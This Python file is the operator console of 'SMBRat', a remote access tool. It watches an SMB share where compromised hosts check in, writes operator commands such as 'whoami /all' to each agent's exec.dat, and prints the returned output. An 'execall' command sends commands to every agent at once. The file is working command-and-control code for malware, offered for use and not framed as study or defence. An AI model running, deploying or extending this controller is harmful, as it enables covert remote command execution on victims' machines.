import argparse
import cmd
import os

from watchdog.events import FileSystemEventHandler, DirCreatedEvent
from watchdog.observers import Observer

EXEC_DAT = 'exec.dat'
OUTPUT_DAT = 'output.dat'
Share = None

Sessions = dict(default = dict())

def get_exec_path(project, agent):
	return Share + os.sep + project + os.sep + agent + os.sep + EXEC_DAT

def get_output_path(project, agent):
	return Share + os.sep + project + os.sep + agent + os.sep + OUTPUT_DAT


def initialize(share_folder) :
	"""
	Traverse the "Share/" shared folder and parse the tree of Projects and Agents.
	Share/
		|
		\--Project1
		|		|
		|		\--<Hostname1>-<MAC_ADDRESS1>
		|		\--<Hostname2>-<MAC_ADDRESS2>
		|
		\--Project2
				|
				\--<Hostname3>-<MAC_ADDRESS3>
		[...]
	"""
	global Share
	Share = share_folder

	projects = os.listdir(Share)

	for project in projects:
		Sessions[project] = {}
		project_dir = Share + os.sep + project
		agents = os.listdir(project_dir)

		for agent in agents:
			agent_dir = project_dir + os.sep + agent + os.sep
			Sessions[project][agent] = {}
			Sessions[project][agent]['exec'] = os.path.isfile(agent_dir + EXEC_DAT)
			Sessions[project][agent]['output'] = os.path.isfile(agent_dir + OUTPUT_DAT)


class SessionHandler(FileSystemEventHandler) :

	def on_created(self, event):
		# print(event)
		if type(event) == DirCreatedEvent :
			# if path of type <Share>/<ProjectName>/<Agent-MAC>
			if event.src_path.count(os.sep) == 2 :
				project, agent = event.src_path.split(os.sep)[1:]
				# MAC characters: len('XX:XX:XX:XX:XX:XX') = 17
				agent_hostname, agent_mac = agent[:-18], agent[-17:]
				# print (project, agent_hostname, agent_mac)
				print ('''
[+] Agent "{}" ({}) just checked-in for Project: "{}"
'''.format(agent_hostname, agent_mac, project))
				Sessions[project] = {}
				Sessions[project][agent] = {}
		# print (Sessions)




	def on_deleted(self, event):
		if event.src_path.endswith(EXEC_DAT):
			project, agent = event.src_path.split(os.sep)[1:-1]
			output_dat = get_output_path(project, agent)
			with open(output_dat, 'r') as output_file:

				print ('''
[<] Response from '{project}/{hostname}': 

{response}
^^^^^^^^^^^^^^^^^^^^ {project}/{hostname} ^^^^^^^^^^^^^^^^^^^^
					'''.format(project = project, hostname = agent, response =output_file.read())
					) 


class SMBRatShell(cmd.Cmd) :

	def __init__(self, session_dict) :
		super().__init__()
		self.prompt = 'SMBRat> '
		self.session_dict = session_dict
		self.selected = set()

	# def do_EOF(self, *args): return ''
	def emptyline(self, *args): return ''

	def do_session(self, line):
		print(self.session_dict)
		pass

	def do_selected(self, line):
		"""
> selected

Shows the list of Selected Agents

		"""
		if not self.selected:
			print ("No agents selected!")
			return ""
		for project, agent in self.selected:
			print ("{project} / {agent}".format(project = project, agent = agent))


	def do_execall(self, line):
		"""
> execall <cmd>

Runs the <cmd> to *ALL AGENTS*
Example:
> execall "whoami /all"

		"""
		saved_selected = self.selected
		allset = set()
		for project in self.session_dict.keys():
			for agent in self.session_dict[project].keys():
				allset.add((project, agent))

		self.selected = allset
		self.do_exec(line)
		self.selected = saved_selected


	def do_exec(self, line):
		"""
> exec <cmd>

Runs the <cmd> to the selected Agents
Example:
> exec "whoami /all"
		"""
		for project, agent in self.selected:
			exec_path = get_exec_path(project, agent)
			try :
				with open(exec_path, 'w+') as exfile:
					exfile.write(line)
					print ('''
[>] Sending '{command}' to "{project}/{hostname}" ...'''.format(command = line, project = project, hostname = agent))

			except PermissionError as perror:
				print ('''
[!!!] Could not write to '{path}'.

Usually happens because the SMB Server (who creates the files) runs as "root" (to bind the port 445 TCP).
Type the command below to a new root shell and retry:
	chmod -R 777 "{share}"'''.format(path = exec_path, share = Share) )
				return


if __name__ == '__main__' :

	parser = argparse.ArgumentParser()

	parser.add_argument('SHARE_PATH', help = 'Path to the directory that is used with the SMB Share')
	parser.add_argument('--smb-auto-start', '-s', help = '''Uses impacket's "smbserver.py" to start an SMB Server with specified "ShareName"''',\
						default = False, action = 'store_true')

	args = parser.parse_args()

	share_folder = args.SHARE_PATH
	initialize(share_folder)

	shell = SMBRatShell(Sessions)

	observer = Observer()
	event_handler = SessionHandler()
	observer.schedule(event_handler, share_folder, recursive=True)
	observer.start()

	shell.cmdloop()